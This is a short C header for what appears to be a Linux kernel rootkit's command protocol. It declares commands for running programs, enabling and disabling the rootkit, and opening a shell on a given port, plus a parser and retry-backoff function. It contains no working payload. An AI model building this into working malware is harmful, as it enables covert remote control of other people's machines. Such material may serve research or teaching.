/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_PROTOCOL_H
#define ROOTKITLINGS_PROTOCOL_H

#ifdef __KERNEL__
#include <linux/types.h>
#else
#include <stddef.h>
#include <stdint.h>
typedef uint16_t u16;
#endif

enum rk_command_kind {
	RK_COMMAND_INVALID,
	RK_COMMAND_PING,
	RK_COMMAND_INFO,
	RK_COMMAND_STATUS,
	RK_COMMAND_MARK,
	RK_COMMAND_ENABLE,
	RK_COMMAND_DISABLE,
	RK_COMMAND_RUN,
	RK_COMMAND_SHELL,
	RK_COMMAND_SHELL_STATUS,
	RK_COMMAND_QUIT,
};

#define RK_MARK_MAX 32

struct rk_command {
	enum rk_command_kind kind;
	u16 shell_port;
	char mark[RK_MARK_MAX];
};

int rk_command_parse(const unsigned char *bytes, size_t length,
		     struct rk_command *command);
unsigned int rk_retry_next(unsigned int current_ms, unsigned int base_ms,
			   unsigned int maximum_ms);

#endif
